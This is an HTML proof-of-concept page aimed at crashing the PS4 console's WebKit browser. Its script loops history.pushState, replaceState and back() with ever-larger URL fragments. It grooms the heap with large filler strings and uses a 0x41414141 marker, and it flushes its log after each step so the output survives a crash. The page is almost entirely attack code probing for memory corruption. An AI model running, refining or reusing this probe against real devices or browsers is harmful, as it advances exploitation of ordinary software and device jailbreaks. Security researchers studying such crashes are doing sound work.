<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – History Crash PoC (Flush Logs)</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
#log { white-space: pre-wrap; }
button { padding:10px; margin:10px; }
</style>
</head>

<body>

<h2>PS4 WebKit – History.pushState Crash PoC (Flush)</h2>
<button onclick="run()">RUN</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");

function log(m) {
    logEl.textContent += m + "\n";
    // FORÇA repaint síncrono (CRÍTICO)
    logEl.offsetHeight;
}

/* =========================
   GLOBAL STATE (REUSED)
========================= */

let sharedState = {
    iter: 0,
    payload: "",
    marker: 0x41414141
};

let heap = []; // grooming persistente

function run() {
    log("[*] START");

    let size = 977;

    for (let i = 0; i < 50; i++) {
        sharedState.iter = i;
        sharedState.payload = "A".repeat(size);

        heap.push("G".repeat(1024 * 32)); // grooming cumulativo

        log("[ITER " + i + "] size=" + size);
        log("  -> before pushState");

        history.pushState(sharedState, "", "#" + sharedState.payload);
        log("  -> after pushState");

        history.replaceState(sharedState, "", "#" + sharedState.payload);
        log("  -> after replaceState");

        if (i % 2 === 0) {
            log("  -> history.back()");
            history.back();
        }

        log("  -> end iter");

        size += 14461;
    }

    log("[*] END (no crash?)");
}

log("Loaded.");
</script>

</body>
</html>
